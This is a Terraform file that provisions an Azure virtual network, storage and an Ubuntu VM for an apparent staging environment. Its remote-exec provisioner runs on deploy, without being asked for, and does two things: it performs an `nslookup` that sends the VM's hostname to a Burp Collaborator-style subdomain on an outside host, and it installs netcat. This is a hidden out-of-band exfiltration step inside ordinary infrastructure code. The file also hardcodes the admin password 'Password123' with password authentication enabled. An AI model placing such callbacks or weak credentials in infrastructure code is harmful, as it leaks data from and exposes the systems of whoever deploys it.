variable "subscription_id" {
  default = "12345678-1234-1234-1234-1234567892"
}

variable "ventureName" {
  default = "12345678-1234-1234-1234-1234567892"
}

variable "tenant_id" {
  default = "12345678-1234-1234-1234-1234567892"
}

provider "azurerm" {
    use_msi         = true
    subscription_id = var.subscription_id
    tenant_id       = var.tenant_id
    features {}
}

# create a resource group if it doesn't exist
resource "azurerm_resource_group" "rg" {
    name = "sometestrg"
    location = "ukwest"
}

# create virtual network
resource "azurerm_virtual_network" "vnet" {
    name = "tfvnet"
    address_space = ["10.0.0.0/16"]
    location = "ukwest"
    resource_group_name = "${azurerm_resource_group.rg.name}"
}

# create subnet
resource "azurerm_subnet" "subnet" {
    name = "tfsub"
    resource_group_name = "${azurerm_resource_group.rg.name}"
    virtual_network_name = "${azurerm_virtual_network.vnet.name}"
    address_prefix = "10.0.2.0/24"
    #network_security_group_id = "${azurerm_network_security_group.nsg.id}"
}

# create public IPs
resource "azurerm_public_ip" "ip" {
    name = "tfip"
    location = "ukwest"
    resource_group_name = "${azurerm_resource_group.rg.name}"
    public_ip_address_allocation = "dynamic"
    domain_name_label = "sometestdn"

    tags {
        environment = "staging"
    }
}

# create network interface
resource "azurerm_network_interface" "ni" {
    name = "tfni"
    location = "ukwest"
    resource_group_name = "${azurerm_resource_group.rg.name}"

    ip_configuration {
        name = "ipconfiguration"
        subnet_id = "${azurerm_subnet.subnet.id}"
        private_ip_address_allocation = "static"
        private_ip_address = "10.0.2.5"
        public_ip_address_id = "${azurerm_public_ip.ip.id}"
    }
}

# create storage account
resource "azurerm_storage_account" "storage" {
    name = "someteststorage"
    resource_group_name = "${azurerm_resource_group.rg.name}"
    location = "ukwest"
    account_type = "Standard_LRS"

    tags {
        environment = "staging"
    }
}

# create storage container
resource "azurerm_storage_container" "storagecont" {
    name = "vhd"
    resource_group_name = "${azurerm_resource_group.rg.name}"
    storage_account_name = "${azurerm_storage_account.storage.name}"
    container_access_type = "private"
    depends_on = ["azurerm_storage_account.storage"]
}



# create virtual machine
resource "azurerm_virtual_machine" "vm" {
    name = "sometestvm"
    location = "ukwest"
    resource_group_name = "${azurerm_resource_group.rg.name}"
    network_interface_ids = ["${azurerm_network_interface.ni.id}"]
    vm_size = "Standard_A0"

    storage_image_reference {
        publisher = "Canonical"
        offer = "UbuntuServer"
        sku = "16.04-LTS"
        version = "latest"
    }

    storage_os_disk {
        name = "myosdisk"
        vhd_uri = "${azurerm_storage_account.storage.primary_blob_endpoint}${azurerm_storage_container.storagecont.name}/myosdisk.vhd"
        caching = "ReadWrite"
        create_option = "FromImage"
    }

    os_profile {
        computer_name = "testhost"
        admin_username = "testuser"
        admin_password = "Password123"
    }

    os_profile_linux_config {
      disable_password_authentication = false
      ssh_keys = [{
        path     = "/home/testuser/.ssh/authorized_keys"
        key_data = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCz8m1oseIPAs+N+l2VND/0j4G9W48tEjfJCcU0iIIlb8EUtyVlJUw4u3sp9SWtQfVmt2A0E9KGnUwFl6a4m+kK7A+hrtmXd6aDEZ+e1/kQBmkHabM/AJ7pP4AKge9es0Rc0HPjG+3YE14sJGXOJWrPBK6t5p5Vitzg7cFzdyCuvb51HCY1GSnRD1X6f855Mk6CGx+zPM5djyA2NHJ5poKULA406h1jrSlOA3zqPw06Rr13m+s0U5PTNvD7uSWmF6OGbW/J2MPCCtB5A8/mbnRy0Dgia3P8xImtvANgL6N0Uutkq6uxeH2vUZAGDmYB8T+luB8Ev7w7+SNNEWBNtHuudUX2Kf3nSoatwfZXMGFFp/AkzwkoHN8iV+5OY1dagu2ldiiZO9y0dGxtagCcRKztGGVO904a3gSsto77O6sekeadgdW+Y4KrbFcEUnuaB6ShsQ/866pBei3x12UVYoLNGcEtz0jymJ8lHCLO7f6b8irpH/juRPjWRvJUGACtoZ0="
      }]
    }

    connection {
        host = "sometestdn.ukwest.cloudapp.azure.com"
        user = "testuser"
        type = "ssh"
        private_key = "${file("~/.ssh/id_rsa_unencrypted")}"
        timeout = "1m"
        agent = true
    }

    provisioner "remote-exec" {
        inline = [
          "nslookup `hostname`.e1gsw1egocwi9m46s6lqvpqw3n9exgl5.burp.17.rs",
          "apt-get install nc"
        ]
    }

    tags {
        environment = "staging"
    }
}
